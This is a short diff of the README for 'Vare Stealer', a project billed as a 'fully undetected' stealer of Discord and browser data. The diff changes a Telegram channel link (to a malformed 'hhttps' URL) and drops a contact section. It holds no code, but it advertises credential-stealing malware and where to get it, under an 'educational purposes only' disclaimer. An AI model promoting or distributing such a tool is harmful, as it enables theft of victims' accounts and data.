@@ -13,7 +13,7 @@
   <p align="center">
     Fully Undetected Discord Browser Stealer
     <br />
-    <a href="https://t.me/varestealer"><strong>Telegram Channel</strong></a>
+    <a href="hhttps://t.me/VareStealerRemade"><strong>Telegram Channel</strong></a>
     <br />
     <br />
     <a href="https://github.com/saintdaddy/Vare-Stealer/issues">Report Bug</a>
@@ -131,9 +131,6 @@ If you want to support me and my project, you can do the following, **thank you*
 I am not responsible in any way for any damage that may be caused by this program, it is shared for educational purposes only.
 
 
-<!-- CONTACT -->
-## 📫 Contact
 
-https://t.me/varestealer
 
 
